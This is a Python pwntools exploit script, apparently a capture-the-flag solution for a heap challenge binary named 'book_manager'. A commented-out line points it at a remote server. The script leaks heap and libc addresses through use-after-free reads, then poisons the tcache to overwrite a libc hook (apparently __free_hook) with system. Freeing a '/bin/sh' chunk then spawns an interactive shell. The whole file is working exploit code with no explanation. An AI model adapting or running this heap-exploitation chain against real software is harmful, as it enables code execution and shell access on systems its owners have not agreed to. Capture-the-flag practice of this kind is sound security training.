from pwn import *

io = process('./book_manager')
#io = remote('61.28.237.24', 30208)
elf = ELF('/lib/x86_64-linux-gnu/libc.so.6')


def add(book_idx, page_size, content):
    print(io.recvuntil(b'> Your choice: '))
    io.sendline('1')
    print(io.recvuntil(b'[+] Which book you want to add a new page?: '))
    io.sendline(str(book_idx))
    print(io.recvuntil(b'> '))
    io.sendline('1')
    print(io.recvuntil(b'[+] New page size: '))
    io.sendline(str(page_size))
    print(io.recvuntil(b'[+] Enter new content: '))
    io.send(content)

def dup(book_idx, book_to_dup_from, page_to_dup_from):
    print(io.recvuntil(b'> Your choice: '))
    io.sendline('1')
    print(io.recvuntil(b'[+] Which book you want to add a new page?: '))
    io.sendline(str(book_idx))
    print(io.recvuntil(b'> '))
    io.sendline('2')
    print(io.recvuntil(b'[+] Which book you want to copy from?: '))
    io.sendline(str(book_to_dup_from))
    print(io.recvuntil(b'[+] Which page you want to copy from?: '))
    io.sendline(str(page_to_dup_from))

def prit(book_idx, page_idx):
    print(io.recvuntil(b'> Your choice: '))
    io.sendline('2')
    print(io.recvuntil(b'[+] Which book you want to print?: '))
    io.sendline(str(book_idx))
    print(io.recvuntil(b'[+] Which page you want to print?: '))
    io.sendline(str(page_idx))

def edit(book_idx, page_idx, content):
    print(io.recvuntil(b'> Your choice: '))
    io.sendline('3')
    print(io.recvuntil(b'[+] Which book you want to edit?: '))
    io.sendline(str(book_idx))
    print(io.recvuntil(b'[+] Which page you want to edit?: '))
    io.sendline(str(page_idx))
    print(io.recvuntil(b'[+] Enter new content: '))
    io.send(content)

def dele(book_to_delete_page_from):
    print(io.recvuntil(b'> Your choice: '))
    io.sendline('4')
    print(io.recvuntil(b'[+] Which book you want to delete page?: '))
    io.sendline(str(book_to_delete_page_from))


# leak heap
add(2, 4, b'A')
add(2, 4, b'B')
dele(2)
dele(2)
prit(2, 0)
print(io.recvuntil(b'[+] Content: '))
a = io.recv(4)+b'\0\0\0\0'
heap_base = u64(a)- 0x2c0
b = hex(heap_base)
log.info(f'Heap: {b}')
add(2, 4, b'A')
add(2, 4, b'B')


# leak libc
add(0, 2000, b'AAAA')
add(1, 2000, b'BBBB')
dele(0)
prit(0, 0)
print(io.recvuntil(b'[+] Content: '))
a= io.recv(6)+b'\0\0'
libc_start_main = u64(a)-1854496
add(0, 2000, b'AAAA')


add(4, 1000, b'A'*4)
dup(4, 4, 0)
add(4, 0x40, b'A')
add(4, 0x40, b'A')
dele(4)
dele(4)
pl = b'A'*24+p64(0x51)+p64(libc_start_main - elf.sym['__libc_start_main'] + 0x1eeb28-8)+p64(0)#+p64(heap_base + 0x10)
edit(4, 1, pl)
add(4, 0x40, b'A')
pause()
add(4, 0x40, b"/bin/sh\0" + p64(libc_start_main-elf.sym['__libc_start_main']+elf.sym['system']))
dele(4)
io.interactive()
